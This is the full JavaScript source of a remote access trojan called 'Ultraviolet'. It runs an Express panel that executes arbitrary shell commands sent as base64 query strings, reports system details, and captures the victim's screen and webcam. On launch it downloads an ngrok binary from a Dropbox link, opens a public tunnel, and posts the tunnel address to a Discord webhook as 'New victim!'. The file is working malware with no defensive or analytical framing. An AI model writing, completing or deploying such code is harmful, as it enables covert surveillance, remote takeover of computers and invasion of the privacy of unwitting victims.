const ngrok = require("ngrok");
const express = require("express");
const si = require("systeminformation");
const { exec } = require("child_process");
const screenshot = require("screenshot-desktop");
const fs = require("fs");
const https = require("https");
const NodeWebcam = require("node-webcam");

const FILE_index = `<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Ultraviolet</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="https://unpkg.com/mvp.css@1.12/mvp.css"> 
    </head>
    <body>
        <div id="side-panel" style="position: fixed; top: 0; left: 0; width: 20vw; height: 100vh">
            <br><a href="/info" target="main" class="">Info</a><br>
            <br><a href="/command" target="main" class="">Run command</a><br>
            <br><a href="/screen" target="main" class="">Screen</a><br>
            <br><a href="/camera" target="main" class="">Camera</a><br>
        </div>
        <iframe id="content" name="main" style="position: fixed; top: 0; left: 20vw; width: 80vw; height: 100vh; border-width: 0"></div>
    </body>
</html>`;
const FILE_command = `<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Ultraviolet | Run command</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="https://unpkg.com/mvp.css@1.12/mvp.css"> 
    </head>
    <body>
        <input id="command"><button id="send">Send -></button><br>
        <textarea id="error" style="width: 400px; height: 300px; display: inline-block;" placeholder="error" readonly></textarea>
        <textarea id="stderr" style="width: 400px; height: 300px; display: inline-block;" placeholder="stderr" readonly></textarea>
        <textarea id="stdout" style="width: 400px; height: 300px; display: inline-block;" placeholder="stdout" readonly></textarea>
        <script>
            document.querySelector("#send").addEventListener("click", () => {
                fetch("/runcommand?command=" + btoa(document.querySelector("#command").value)).then(res => res.json()).then(res => {
                    document.querySelector("#error").value = res.error;
                    document.querySelector("#stderr").value = res.stderr;
                    document.querySelector("#stdout").value = res.stdout;
                });
            });
        </script>
    </body>
</html>`;

const AUTHTOKEN = process.env.t;
const DISCORD_WEBHOOK_URL = process.env.d;
const PORT = 27539;
const NGROK = "https://dl.dropboxusercontent.com/s/k3zcbd4m7e25tcr/ngrok.exe?dl=0";

const app = express();

app.get("/info", async (req, res) => {
    const i_cpu = await si.cpu();
    const i_mem = await si.mem();
    const i_bat = await si.battery();
    const i_sys = await si.system();
    const i_tim = await si.time();
    const i_osi = await si.osInfo();
    
    res.type("txt");
    try {
        res.send(`System info

Uptime: ${i_tim.uptime} s
Current time: ${i_tim.current}

Model: ${i_sys.manufacturer} ${i_sys.model} ${i_sys.version}
UUID: ${i_sys.uuid}

CPU: ${i_cpu.manufacturer} ${i_cpu.brand} ${i_cpu.model}
Speed: ${i_cpu.speed} gHz
Cores: ${i_cpu.cores}

Memory: ${i_mem.total} B
Free: ${i_mem.free} B

Battery: ${i_bat.percent}%
Is charging: ${i_bat.isCharging ? "YES" : "NO"}

OS: ${i_osi.platform} ${i_osi.distro} ${i_osi.release} ${i_osi.kernel}
`);
    } catch (err) {
        // res.send(err);
    }
});
app.get("/runcommand", (req, res) => {
    exec(atob(req.query.command), (error, stdout, stderr) => {
        res.send({ "error": JSON.stringify(error, null, 4), stdout, stderr });
    });
});
app.get("/screen", (req, res) => {
    res.type("png");
    screenshot({format: "png"}).then(img => res.send(img)).catch(err => res.send(err));
});
app.get("/camera", (req, res) => {
    NodeWebcam.capture("camera", { "width": 1920, "height": 1080, "output": "png" }, (err, data) => {
        if(err) return res.send(err);
        res.type("png");
        res.send(fs.readFileSync("camera.png"));
    })
});
app.get("/", (req, res) => res.send(FILE_index));
app.get("/command", (req, res) => res.send(FILE_command));

const sendMessage = msg => fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ "content": msg })
});

(async () => {
    const file = fs.createWriteStream("ngrok.exe");
    https.get(NGROK, response => {
        response.pipe(file);
        file.on("finish", async () => {
            file.close(async () => {
                sendMessage("New victim!\n" + await ngrok.connect({ "addr": PORT, "binPath": x => process.platform == "win32" ? "." : x, "authtoken": AUTHTOKEN }));
                app.listen(PORT);
            });
        });
    });
})();